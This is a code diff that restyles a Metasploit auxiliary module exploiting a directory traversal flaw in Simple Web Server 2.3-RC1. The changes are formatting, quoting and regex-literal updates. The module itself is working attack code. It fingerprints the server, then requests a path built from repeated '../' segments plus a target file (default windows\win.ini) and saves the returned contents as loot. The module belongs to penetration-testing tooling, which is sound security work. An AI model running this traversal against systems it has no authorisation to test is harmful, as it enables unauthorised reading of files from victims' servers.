@@ -9,33 +9,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Simple Web Server 2.3-RC1 Directory Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Simple Web Server 2.3-RC1 Directory Traversal',
+        'Description' => %q{
           This module exploits a directory traversal vulnerability found in
-        Simple Web Server 2.3-RC1.
-      },
-      'References'     =>
-        [
+          Simple Web Server 2.3-RC1.
+        },
+        'References' => [
           [ 'CVE', '2002-1864' ],
           [ 'OSVDB', '88877' ],
           [ 'EDB', '23886' ],
           [ 'URL', 'https://seclists.org/bugtraq/2013/Jan/12' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'CwG GeNiuS',
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2013-01-03'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2013-01-03'
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\win.ini']),
-        OptInt.new('DEPTH',       [true, 'The max traversal depth', 8])
-      ])
+        OptInt.new('DEPTH', [true, 'The max traversal depth', 8])
+      ]
+    )
   end
 
   #
@@ -46,10 +48,10 @@ class MetasploitModule < Msf::Auxiliary
   def parse_status_line(res)
     str = res.to_s
 
-    status_line = str.scan(/HTTP\/(.+?)\s+(\d+)\s?(.+?)\r?\n?$/)
+    status_line = str.scan(%r{HTTP/(.+?)\s+(\d+)\s?(.+?)\r?\n?$})
 
     if status_line.empty?
-      print_error("Invalid response command string.")
+      print_error('Invalid response command string.')
       return
     elsif status_line.length == 1
       proto, code, message = status_line[0]
@@ -60,7 +62,6 @@ class MetasploitModule < Msf::Auxiliary
     return message, code.to_i, proto
   end
 
-
   #
   # The MSF API cannot parse this weird response
   #
@@ -69,34 +70,32 @@ class MetasploitModule < Msf::Auxiliary
     str.split(/\r\n\r\n/)[2] || ''
   end
 
-
   def is_sws?
-    res = send_request_raw({'uri'=>'/'})
-    if res and res.headers['Server'].to_s =~ /PMSoftware\-SWS/
+    res = send_request_raw({ 'uri' => '/' })
+    if res && res.headers['Server'].to_s =~ (/PMSoftware-SWS/)
       return true
     else
       return false
     end
   end
 
-
   def run_host(ip)
-    if not is_sws?
+    if !is_sws?
       print_error("#{ip}:#{rport} - This isn't a Simple Web Server")
       return
     end
 
-    uri = normalize_uri("../"*datastore['DEPTH'], datastore['FILEPATH'])
-    res = send_request_raw({'uri'=>uri})
+    uri = normalize_uri('../' * datastore['DEPTH'], datastore['FILEPATH'])
+    res = send_request_raw({ 'uri' => uri })
 
-    if not res
+    if !res
       print_error("#{ip}:#{rport} - Request timed out.")
       return
     end
 
     # The weird HTTP response totally messes up Rex::Proto::Http::Response, HA!
     message, code, proto = parse_status_line(res)
-    body                 = parse_body(res)
+    body = parse_body(res)
 
     if code == 200
 
@@ -111,8 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       p = store_loot('simplewebserver.file', 'application/octet-stream', ip, body, fname)
       print_good("#{ip}:#{rport} - #{fname} stored in: #{p}")
     else
-      print_error("#{ip}:#{rport} - Unable to retrieve file: #{code.to_s} (#{message})")
+      print_error("#{ip}:#{rport} - Unable to retrieve file: #{code} (#{message})")
     end
   end
 end
-
